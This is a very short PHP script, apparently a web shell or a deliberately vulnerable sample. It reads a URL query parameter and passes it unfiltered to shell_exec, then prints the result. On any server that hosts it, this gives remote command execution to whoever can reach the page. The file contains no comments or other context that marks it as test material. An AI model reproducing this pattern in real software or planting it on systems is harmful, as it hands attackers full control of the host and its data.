<?php
$param = $_GET["param"];
$out = shell_exec($param);
var_dump($out);
